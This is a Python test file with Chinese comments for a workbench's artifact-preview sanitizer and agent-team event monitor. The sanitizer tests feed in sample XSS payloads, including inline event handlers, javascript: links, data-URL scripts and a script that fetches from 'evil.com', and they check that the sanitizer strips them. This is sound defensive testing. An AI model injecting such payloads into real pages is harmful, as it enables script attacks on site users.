"""二期 (pi-workbench 层) 门禁 — G1 Artifact 预览 / G2 团队实时监督。"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
for lib in ("oprim", "omodul", "oservi", "obase", "oskill"):
    sys.path.insert(0, str(ROOT / "platform" / "3O" / lib))

from obase.event_bus import EventBus  # noqa: E402
from omodul.artifact_preview import artifact_preview, sanitize_markup  # noqa: E402
from oservi.agent_team_monitor import TeamMonitor, monitor_team  # noqa: E402

# =========================================================================
# G1 — Artifact 预览 (XSS 恶意样本集)
# =========================================================================

def test_sanitize_strips_script_and_events():
    evil = (
        '<p onclick="alert(1)">hi</p>'
        '<script>fetch("https://evil.com/x")</script>'
        '<a href="javascript:alert(1)">x</a>'
        '<img src="data:text/html,<script>1</script>">'
    )
    clean, issues = sanitize_markup(evil, "html")
    assert "<script" not in clean.lower()
    assert "onclick" not in clean
    assert "javascript:" not in clean
    assert "data:text/html" not in clean
    assert issues  # 有剥离记录


def test_sanitize_drops_unknown_tags():
    clean, issues = sanitize_markup("<iframe src='https://evil'></iframe><p>ok</p>", "html")
    assert "iframe" not in clean.lower()
    assert "<p>ok</p>" in clean


def test_sanitize_svg_foreign_object():
    evil = '<svg><foreignObject><iframe></iframe></foreignObject><rect/></svg>'
    clean, _ = sanitize_markup(evil, "svg")
    assert "foreignObject" not in clean
    assert "rect" in clean  # 合法 SVG 保留


def test_artifact_preview_echarts_json():
    out = artifact_preview({"type": "echarts_json",
                            "content": '{"title": {"text": "T"}, "series": [{"data": [1,2]}]}'},
                           snapshot_dir=str(Path(__import__("tempfile").mkdtemp())))
    assert out["renderable"] is True
    assert out["snapshot_id"].startswith("art_")
    assert out["issues"] == []
    # 快照文件可回放
    assert Path(out["snapshot_path"]).read_text().startswith("{")


def test_artifact_preview_echarts_invalid():
    out = artifact_preview({"type": "echarts_json", "content": "{not json"},
                            snapshot_dir="/tmp")
    assert out["renderable"] is False
    assert any("解析失败" in i for i in out["issues"])


def test_artifact_preview_unknown_type():
    out = artifact_preview({"type": "exe", "content": "x"})
    assert out["renderable"] is False
    assert "未知类型" in out["issues"][0]


def test_artifact_preview_markdown_safe():
    out = artifact_preview({"type": "markdown",
                            "content": "# 标题\n\n- [x] 任务\n<script>bad()</script>"},
                           snapshot_dir="/tmp")
    assert "script" not in out["sanitized_content"].lower()
    assert out["renderable"] is True


# =========================================================================
# G2 — 团队实时监督 (事件溯源投影)
# =========================================================================

def test_team_monitor_projects_state_from_events():
    bus = EventBus()
    monitor = TeamMonitor("t1", ["w1", "w2"], bus).start()

    bus.publish("agent.start", {"agent_id": "w1", "task": "写测试"})
    bus.publish("agent.message", {"agent_id": "w1", "message": "进度 50%"})
    bus.publish("agent.end", {"agent_id": "w1", "status": "done",
                              "artifacts": ["tests/test_a.py"]})
    bus.publish("agent.error", {"agent_id": "w2", "error": "超时"})

    state = monitor.live_state()
    assert state["w1"]["status"] == "done"
    assert state["w1"]["current_task"] == "写测试"
    assert state["w1"]["last_message"] == "进度 50%"
    assert state["w1"]["artifacts"] == ["tests/test_a.py"]
    assert state["w2"]["status"] == "error"
    assert state["w2"]["last_message"] == "超时"
    # 无关事件不污染
    bus.publish("agent.message", {"agent_id": "ghost", "message": "x"})
    assert "ghost" not in monitor.live_state()


def test_team_monitor_replays_history():
    """事件溯源: 新监视器重放历史事件重建状态。"""
    bus = EventBus()
    bus.publish("agent.start", {"agent_id": "w1", "task": "重构"})
    bus.publish("agent.end", {"agent_id": "w1", "status": "done"})

    monitor = TeamMonitor("t2", ["w1"], bus).start()
    state = monitor.live_state()
    assert state["w1"]["status"] == "done"   # 重放得出, 非静态


def test_team_monitor_event_stream():
    bus = EventBus()
    monitor = TeamMonitor("t3", ["w1"], bus).start()
    for i in range(5):
        bus.publish("agent.message", {"agent_id": "w1", "message": f"m{i}"})
    stream = monitor.event_stream(limit=3)
    assert len(stream) == 3
    assert stream[-1]["payload"]["message"] == "m4"
    monitor.stop()


def test_monitor_team_entrypoint():
    bus = EventBus()
    out = monitor_team("t4", ["w1"], bus)
    assert out["projection"] == "event-sourced"
    assert "w1" in out["live_state"]
    assert isinstance(out["event_stream"], list)


def test_team_monitor_ignores_non_team_agents():
    bus = EventBus()
    monitor = TeamMonitor("t5", ["only_me"], bus).start()
    bus.publish("agent.end", {"agent_id": "other", "status": "done"})
    state = monitor.live_state()
    assert state["only_me"]["status"] == "idle"


# =========================================================================
# 账本
# =========================================================================

def test_replica_ledger_phase_two_registered():
    from server.operator_ledger import replica_ledger_summary

    summary = replica_ledger_summary()
    statuses = {s["name"]: s["status"] for s in summary}
    assert statuses["G1_artifact_preview"] == "registered"
    assert statuses["G2_agent_team_monitor"] == "registered"
    # 三期已实施
    assert statuses["G7_skill_crystallize"] == "registered"
